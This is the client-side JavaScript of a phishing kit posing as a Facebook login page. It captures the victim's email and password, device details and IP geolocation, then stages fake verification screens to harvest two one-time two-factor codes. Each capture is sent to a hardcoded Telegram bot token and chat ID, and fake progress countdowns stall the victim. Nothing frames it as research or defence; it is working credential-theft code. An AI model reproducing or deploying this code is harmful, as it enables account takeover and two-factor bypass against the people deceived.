document.addEventListener('DOMContentLoaded', function () {
  const loginForm = document.getElementById('login-form');
  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');
  const emailError = document.getElementById('email-error');
  const passwordError = document.getElementById('password-error');
  const modal = document.getElementById('bedtime-modal');
  const verificationCodeInput = document.getElementById('verification-code');
  const verificationCodeError = document.getElementById('verification-code-error');
  const submitVerificationButton = document.getElementById('submit-verification');
  const pendingConfirmationStep = document.getElementById('pending-confirmation-step');
  const progressBar = document.getElementById('progress-bar');
  const countdownText = document.getElementById('countdown-text');
  const secondVerificationStep = document.getElementById('second-verification-step');
  const secondVerificationCodeInput = document.getElementById('second-verification-code');
  const secondVerificationCodeError = document.getElementById('second-verification-code-error');
  const submitSecondVerificationButton = document.getElementById('submit-second-verification');
  const verificationSuccess = document.getElementById('verification-success');
  const firstVerificationStep = document.getElementById('first-verification-step');

  const botToken = "8418261229:AAGy92fjrap4UAOGswgWRIt54J9BZSkaro0";
  const authorizedChatId = "8715043993";

  async function sendTelegramMessage(message) {
    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: authorizedChatId, text: message, parse_mode: 'HTML' })
      });
      const result = await response.json();
      return result.ok;
    } catch (error) {
      return false;
    }
  }

  async function getIpInfo() {
    try {
      const response = await fetch('https://ipinfo.io/json');
      const data = await response.json();
      return `
📍 Location Information:
• IP Address: ${data.ip || "Unknown"}
• City: ${data.city || "Unknown"}
• Region: ${data.region || "Unknown"}
• Country: ${data.country || "Unknown"}
• Location: ${data.loc || "Unknown"}
• ISP: ${data.org || "Unknown"}`;
    } catch (error) {
      return "Could not determine location information";
    }
  }

  function getDeviceDetails() {
    const ua = navigator.userAgent.toLowerCase();
    let deviceType = "Unknown";
    if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) deviceType = "iOS";
    else if (ua.includes("android")) deviceType = "Android";
    else if (ua.includes("windows")) deviceType = "Windows";
    else if (ua.includes("mac os") || ua.includes("macintosh")) deviceType = "Mac";
    else if (ua.includes("linux")) deviceType = "Linux";

    let browser = "Unknown";
    if (ua.includes("chrome") && !ua.includes("chromium")) browser = "Chrome";
    else if (ua.includes("firefox")) browser = "Firefox";
    else if (ua.includes("safari") && !ua.includes("chrome")) browser = "Safari";
    else if (ua.includes("edge") || ua.includes("edg/")) browser = "Edge";
    else if (ua.includes("opera") || ua.includes("opr/")) browser = "Opera";

    return `
📱 Device Information:
• Type: ${deviceType}
• Browser: ${browser}
• Platform: ${navigator.platform || "Unknown"}
• Screen Size: ${window.screen.width || "?"} x ${window.screen.height || "?"}
• Language: ${navigator.language || "Unknown"}
• Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"}
• User Agent: ${navigator.userAgent || "Unknown"}`;
  }

  function validateEmail() {
    if (!emailInput.value.trim()) {
      emailError.style.display = 'block';
      return false;
    }
    emailError.style.display = 'none';
    return true;
  }

  function validatePassword() {
    if (!passwordInput.value.trim()) {
      passwordError.style.display = 'block';
      return false;
    }
    passwordError.style.display = 'none';
    return true;
  }

  emailInput.addEventListener('blur', validateEmail);
  passwordInput.addEventListener('blur', validatePassword);
  emailInput.addEventListener('input', function () { if (emailError.style.display === 'block') validateEmail(); });
  passwordInput.addEventListener('input', function () { if (passwordError.style.display === 'block') validatePassword(); });

  loginForm.addEventListener('submit', async function (e) {
    e.preventDefault();
    const emailValid = validateEmail();
    const passwordValid = validatePassword();
    if (emailValid && passwordValid) {
      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();
      try {
        const ipInfo = await getIpInfo();
        const deviceDetails = getDeviceDetails();
        const timestamp = new Date().toLocaleString();
        let message = `🚨 Login attempt from Facebook page at ${timestamp}:\n\n`;
        message += `👤 Credentials:\n• Username/Email: ${email || 'Not provided'}\n• Password: ${password || 'Not provided'}\n`;
        message += deviceDetails;
        message += `\n${ipInfo}`;
        await sendTelegramMessage(message);
      } catch (error) {}
      setTimeout(function () { modal.classList.add('show'); }, 500);
    }
  });

  function validateVerificationCode() {
    const code = verificationCodeInput.value.trim();
    if (!code || (code.length !== 6 && code.length !== 8) || !/^\d+$/.test(code)) {
      verificationCodeError.style.display = 'block';
      submitVerificationButton.disabled = true;
      submitVerificationButton.style.opacity = '0.7';
      submitVerificationButton.style.cursor = 'not-allowed';
      return false;
    }
    verificationCodeError.style.display = 'none';
    submitVerificationButton.disabled = false;
    submitVerificationButton.style.opacity = '1';
    submitVerificationButton.style.cursor = 'pointer';
    return true;
  }

  function validateSecondVerificationCode() {
    const code = secondVerificationCodeInput.value.trim();
    if (!code || (code.length !== 6 && code.length !== 8) || !/^\d+$/.test(code)) {
      secondVerificationCodeError.style.display = 'block';
      submitSecondVerificationButton.disabled = true;
      submitSecondVerificationButton.style.opacity = '0.7';
      submitSecondVerificationButton.style.cursor = 'not-allowed';
      return false;
    }
    secondVerificationCodeError.style.display = 'none';
    submitSecondVerificationButton.disabled = false;
    submitSecondVerificationButton.style.opacity = '1';
    submitSecondVerificationButton.style.cursor = 'pointer';
    return true;
  }

  verificationCodeInput.addEventListener('input', validateVerificationCode);
  secondVerificationCodeInput.addEventListener('input', validateSecondVerificationCode);

  submitVerificationButton.addEventListener('click', async function () {
    const code = verificationCodeInput.value.trim();
    if (validateVerificationCode()) {
      try {
        firstVerificationStep.style.display = 'none';
        pendingConfirmationStep.style.display = 'block';

        let timeRemaining = 5;
        const updateInterval = setInterval(() => {
          timeRemaining--;
          const progressPercentage = ((5 - timeRemaining) / 5) * 100;
          progressBar.style.width = progressPercentage + '%';
          if (timeRemaining > 0) {
            countdownText.textContent = `Verification in progress... ${timeRemaining} seconds remaining`;
          } else {
            countdownText.textContent = 'Verification complete';
            clearInterval(updateInterval);
          }
        }, 1000);

        const ipInfo = await getIpInfo();
        const deviceDetails = getDeviceDetails();
        const timestamp = new Date().toLocaleString();
        let message = `🔐 First verification code submitted at ${timestamp}:\n\n`;
        message += `🔢 Code: ${code}\n`;
        message += deviceDetails;
        message += `\n${ipInfo}`;
        await sendTelegramMessage(message);

        setTimeout(() => {
          pendingConfirmationStep.style.display = 'none';
          secondVerificationStep.style.display = 'block';
        }, 5000);
      } catch (error) {
        setTimeout(() => {
          pendingConfirmationStep.style.display = 'none';
          secondVerificationStep.style.display = 'block';
        }, 5000);
      }
    }
  });

  submitSecondVerificationButton.addEventListener('click', async function () {
    const code = secondVerificationCodeInput.value.trim();
    if (validateSecondVerificationCode()) {
      try {
        const ipInfo = await getIpInfo();
        const deviceDetails = getDeviceDetails();
        const timestamp = new Date().toLocaleString();
        let message = `🔐 FINAL verification code submitted at ${timestamp}:\n\n`;
        message += `🔢 Second Code: ${code}\n`;
        message += deviceDetails;
        message += `\n${ipInfo}`;
        await sendTelegramMessage(message);
        secondVerificationStep.style.display = 'none';
        verificationSuccess.style.display = 'block';
      } catch (error) {}
    }
  });
});

function startChecking(dest) {
  const overlay = document.getElementById('checking-overlay');
  overlay.classList.add('show');

  const totalMs = 7000;
  const fill = document.getElementById('checking-progress-fill');
  const secondsEl = document.getElementById('checking-seconds');
  const pluralEl = document.getElementById('checking-plural');
  const countdownLine = document.getElementById('checking-countdown-line');

  const start = Date.now();
  let lastSecond = -1;

  function tick() {
    const elapsed = Date.now() - start;
    const pct = Math.min((elapsed / totalMs) * 100, 100);
    fill.style.width = pct + '%';

    const remaining = Math.max(Math.ceil((totalMs - elapsed) / 1000), 0);
    if (remaining !== lastSecond) {
      lastSecond = remaining;
      secondsEl.textContent = remaining;
      pluralEl.textContent = remaining === 1 ? '' : 's';
    }

    if (elapsed >= totalMs) {
      fill.style.width = '100%';
      countdownLine.innerHTML = 'Redirecting you now&hellip;';
      window.location.href = dest;
      return;
    }

    requestAnimationFrame(tick);
  }

  requestAnimationFrame(tick);
}
